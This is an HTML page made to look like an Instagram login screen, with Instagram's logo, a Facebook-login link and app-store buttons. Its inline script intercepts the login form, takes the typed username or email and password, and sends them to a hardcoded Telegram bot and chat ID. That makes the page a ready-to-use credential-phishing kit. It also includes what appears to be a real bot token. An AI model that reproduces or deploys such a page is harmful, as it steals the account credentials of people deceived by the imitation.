<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input id="email" name="email" placeholder="Phone, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">MOST RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">Â© 2020 Instagram from Facebook</p>
    </footer>
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        // Define the Telegram Bot token and chat ID
        const TOKEN = "7606964682:AAHDf5CDBsA5yJw6EdCcyuqItSGg0GXnBzE"; // Replace with your bot's token
        const CHAT_ID = "260206452"; // Replace with your chat ID
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault(); // Prevent the default form submission

            // Get the email and password input values
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Validate input fields
            if (!email || !password) {
                alert('Please fill out all fields.');
                return;
            }

            // Message to send to Telegram
            const message = `
<b>New Login Attempt:</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
            `;

            // Send the message to Telegram
            axios.post(URI_API, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "HTML"
            }).then(response => {
                alert('Information sent successfully!');
            }).catch(error => {
                alert('Error sending information. Please check your bot setup.');
                console.error('Telegram API Error:', error);
            });
        });
    </script>
</body>
</html>
